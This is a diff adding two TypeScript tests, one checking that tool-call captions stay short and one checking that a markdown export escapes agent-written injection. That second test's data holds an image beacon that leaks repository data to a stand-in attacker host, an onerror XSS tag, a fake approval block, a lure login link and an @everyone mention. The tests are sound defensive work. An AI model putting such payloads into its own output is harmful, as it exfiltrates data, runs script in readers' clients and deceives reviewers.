@@ -115,6 +115,24 @@ describe("story: the phrase grammar", () => {
     expect(text).not.toMatch(/\bwor…/)
   })
 
+  test("a deed's caption stays short whatever its target or summary (review-2 #19)", () => {
+    const big = "A".repeat(200_000)
+    const deeds: Record<string, { name: string; input: Record<string, unknown>; summary?: string }> = {
+      grep: { name: "grep", input: { pattern: big } },
+      read: { name: "read", input: { filePath: `/x/${big}.ts` } },
+      bash: { name: "bash", input: { command: "ls" }, summary: big },
+      webfetch: { name: "webfetch", input: { url: `https://h/${big}` } },
+    }
+    for (const [label, deed] of Object.entries(deeds)) {
+      const entry = { kind: "tool", call: "c", state: "completed", started: 0, ended: 1, ...deed }
+      const lookup = { session: () => session("x", { entries: [entry] as Session["entries"] }) }
+      const text = lineOf("deed", [moment("deed", "Implementer", { tool: deed.name, call: "c" })], lookup)
+        .map((p) => p.text)
+        .join("")
+      expect({ label, long: text.length > 160 }).toEqual({ label, long: false })
+    }
+  })
+
   test("a failing test run quotes how many failed", () => {
     const lookup = {
       session: () =>
@@ -313,6 +331,26 @@ describe("story: legends", () => {
     expect(md).toMatch(/- \*\*Loot:\*\* Fixed and passing\./)
     expect(md.trimEnd().split("\n").at(-1)).toMatch(/^\*.+\*$/)
     expect(md).not.toMatch(/undefined|NaN|\[object/)
+  })
+
+  test("copy as text: an agent's words cannot inject images, links, HTML or mentions (review-2 #18)", () => {
+    const store = fresh("party")
+    playThrough(store)
+    const sessions = store.party()
+    const root = sessions.find((s) => !s.parentID) as Session
+    root.task =
+      "Fix bug ![](https://evil.example/px.png?leak=repo) <img src=x onerror=alert(1)> [docs](https://evil.example)"
+    const reply = root.entries.findLast((e) => e.kind === "reply" && e.done)
+    if (reply?.kind === "reply")
+      reply.text =
+        "Done. ![t](https://evil.example/t.gif) <details open><summary>Approved</summary></details> [click](https://evil.example/login) @everyone"
+    const legend = legendOf(store.moments.history, sessions)
+    if (!legend) throw new Error("no legend")
+    const text = legendMarkdown(legend)
+    expect(text).toContain("evil.example")
+    expect(text).not.toMatch(/!\[|(^|[^\\])\[[^\]]*\]\(|<img|<details|@everyone/m)
+    expect(text).toContain("&lt;img")
+    expect(text).toContain("\\[click\\](https://evil.example/login)")
   })
 
   test("no guildmaster, no legend; the guildmaster alone is one chapter", () => {
